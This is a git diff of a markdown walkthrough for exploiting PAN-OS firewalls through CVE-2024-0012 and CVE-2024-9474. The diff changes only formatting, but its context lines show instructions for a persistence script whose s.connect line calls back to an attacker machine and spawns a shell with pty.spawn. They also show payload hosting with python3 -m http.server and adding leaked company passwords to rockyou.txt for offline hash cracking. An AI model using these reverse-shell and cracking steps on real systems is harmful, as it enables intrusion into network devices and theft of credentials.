@@ -36,7 +36,7 @@ CVE: CVE-2024-0012 and `CVE-2024-9474`
 ### Persistence Script Setup:
 
 1. Perform the following command: `nano pan_os_comm.py`
-2. In nano, copy and paste the below script: ***NOTE- BE SURE TO CHANGE THE IP ADDRESS AND PORT IN THE "s.connect(("10.10.100.169", 63842))" LINE TO MATCH THE IP ADDRESS OF YOUR ATTACK MACHINE AND A RANDOM HIGH PORT OF YOUR CHOICE- end note :) *** Please remember the random high port you choose as you will have to recall it for use in setting up your initial listener and throwing the export.
+2. In nano, copy and paste the below script: **NOTE- BE SURE TO CHANGE THE IP ADDRESS AND PORT IN THE "s.connect(("10.10.100.169", 63842))" LINE TO MATCH THE IP ADDRESS OF YOUR ATTACK MACHINE AND A RANDOM HIGH PORT OF YOUR CHOICE- end note :)** Please remember the random high port you choose as you will have to recall it for use in setting up your initial listener and throwing the export.
 
 ```
 #!/usr/bin/env python3
@@ -68,7 +68,7 @@ pty.spawn("sh")
    `python3 -m http.server <port>`
 
 
-*Update Your `rockyou.txt` Wordlist For Later Password Cracking*
+### *Update Your `rockyou.txt` Wordlist For Later Password Cracking*
 
 Through OSINT and recon, we have located a list of compromised passwords from users within this company. Lets update our rockyou.txt password list to perform offline cracking hashes.
 
